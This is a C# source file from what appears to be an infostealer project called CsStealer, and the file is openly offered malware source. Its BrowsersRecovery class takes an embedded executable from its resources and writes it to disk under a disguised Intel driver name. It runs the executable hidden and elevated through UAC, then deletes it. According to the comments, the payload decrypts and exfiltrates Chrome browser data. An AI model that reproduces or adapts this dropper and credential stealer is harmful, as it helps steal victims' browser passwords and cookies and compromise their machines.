using System;
using System.Reflection;
using System.Diagnostics;


// IMPORTANT: The browsers recovery is not like the others parts, here how it works :
//
// [ UPDATE ] GitHub removed the precompiled file.. so the choice 2 isn't available anymore. Sorry !
//
// The stealer drops an embedded executable in the path BrowsersPayloadDistPath from Config.cs ( default is %userprofile%\Intel® Management Engine Drivers.exe )
//
// The embedded browsers recovery payload is from https://github.com/PhillyStyle/chrome_v20_decryption_CSharp,
// I modified the src of this repo to make it save the exfiltred datas in Config.OutputDir \\ Browsers Datas, but unfortunately I lost this part, so
// you have 2 choice :
//     1 - Download the code from the GitHub project and modify it by yourself (if you know a little C# it will be easy)
//     2 - Use the precompiled version in ./CompiledDatas/ (.reloc_txt, this is just a renamed executable)


namespace CsStealer
{
    class BrowsersRecovery
    {
        public static int GetBrowsersDatas()
        {
            Debugger.Debug("INFO", "Dropping the payload...");

            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                string resourceName = "CS_Stealer.reloc_txt"; // Change it if needed but the default precompiled version is named like that

                using (Stream? stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        Debugger.Debug("ERROR", "Couldn't drop the payload : Resource .reloc_txt not found in assembly");
                        return -1;
                    }

                    using (FileStream fileStream = File.Create(Config.BrowsersPayloadDistPath))
                    {
                        stream.CopyTo(fileStream);
                    }
                }

                using (Process ChromiumStealer = new Process())
                {
                    ChromiumStealer.StartInfo.FileName = Config.BrowsersPayloadDistPath;
                    ChromiumStealer.StartInfo.CreateNoWindow = true;
                    ChromiumStealer.StartInfo.UseShellExecute = true;
                    ChromiumStealer.StartInfo.Verb = "runAs";

                    Debugger.Debug("INFO", "Running the payload with UAC");

                    try
                    {
                        ChromiumStealer.Start();
                        ChromiumStealer.WaitForExit();
                        return ChromiumStealer.ExitCode;
                    }
                    catch (Exception ex)
                    {
                        Debugger.Debug("ERROR", $"Failed to start or run payload: {ex.Message}");
                        return -2;
                    }
                }
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"Error in GetBrowsersDatas: {ex.Message}");
                return -3;
            }
            finally
            {
                if (File.Exists(Config.BrowsersPayloadDistPath))
                {
                    try
                    {
                        File.Delete(Config.BrowsersPayloadDistPath);
                    }
                    catch
                    {
                    }
                }
            }
        }
    }

}
